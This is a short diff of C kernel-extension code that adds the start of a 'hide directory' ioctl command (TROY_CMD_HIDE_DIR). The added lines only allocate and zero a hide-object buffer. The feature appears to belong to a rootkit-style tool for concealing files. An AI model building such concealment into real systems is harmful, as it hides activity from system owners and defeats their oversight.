@@ -112,7 +112,15 @@ int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *
 
         case TROY_CMD_HIDE_DIR:
         {
+            troy_hide_object *user_addr_dirent_obj=(troy_hide_object*)data;
+            troy_hide_object *dirent_hide = (troy_hide_object*)_MALLOC(sizeof(troy_hide_object), M_TEMP, M_WAITOK);
+            if(dirent_hide==NULL)
+            {
+                LOG(LOG_ERROR, "allocate dirent_hide's memory failed");
+                return TROY_ERROR_NOMEM;
+            }
 
+            bzero(dirent_hide, sizeof(troy_hide_object));
         }break;
 
         default:
